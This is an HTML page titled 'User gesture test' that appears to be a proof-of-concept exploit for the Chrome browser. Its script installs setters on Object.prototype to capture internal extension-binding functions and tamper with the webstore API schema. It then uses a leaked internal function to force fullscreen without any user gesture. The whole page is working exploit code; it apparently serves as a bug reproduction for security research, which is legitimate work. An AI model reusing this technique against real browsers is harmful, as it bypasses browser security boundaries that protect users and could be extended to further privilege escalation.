<!doctype html>
<title>User gesture test</title>
This webpage will go fullscreen automatically in 1 second.
<script>
var result;
var called = false;
var leaked = Object.create(null);
["makeElementFullscreen", "WebViewImpl", "run", "Binding", "loadTypeSchema"].forEach(function(name) {
  Object.defineProperty(Object.prototype, name, {
    configurable: true,
    enumerable: false,
    set: function(func) {
      if(typeof func === "boolean") return;
      if(name === "WebViewImpl") {
        Object.defineProperty(this, name, { value: func });
        if(func) {
          this.webView = function() {};
        }
        return;
      } else if(name === "loadTypeSchema") {
        if(func) {
          Object.defineProperty(this, name, {
            value: function() {
              return { js_module: "webView", functions: [] };
            }
          });
          delete Object.prototype[name];
        }
        return;
      }

      leaked[name] = func;
      if(name !== "Binding") {
        delete Object.prototype[name];
      }

      Object.defineProperty(this, name, {
        writable: true,
        configurable: true,
        enumerable: true,
        value: func
      });

      if(name === "Binding" && func.prototype) {
        var old = func.prototype.generate;
        func.prototype.generate = function() {
          if(this.apiFunctions_ && this.apiFunctions_.namespace === "webView") {
            return {};
          }
          if(this.schema_ && (!this.schema_.properties || this.schema_.properties[""])) {
            this.schema_.properties = { "isInstalled": { type: "", value: 1 } };
            this.schema_.namespace = "webstore";
          };
          return old.apply(this, arguments);
        };

        this[name] = func;

        if(!called) {
          called = true;
          func.prototype.generate.call({
            runHooks_: function() {},
            schema_: {
              namespace: "webstore",
              properties: {
                "isInstalled": { type: "", $ref: 1, value: [] }
              }
            }
          });
        }
      }
    }
  });
});

chrome.webstore.onDownloadProgress;

leaked.run("", "", "", function() {
  chrome.runtime.lastError;
}, []);

setTimeout(function() {
leaked.makeElementFullscreen.call({
  element: {
    webkitRequestFullScreen: function() {
      document.body.webkitRequestFullscreen();
    }
  }
});
}, 1000);
</script>
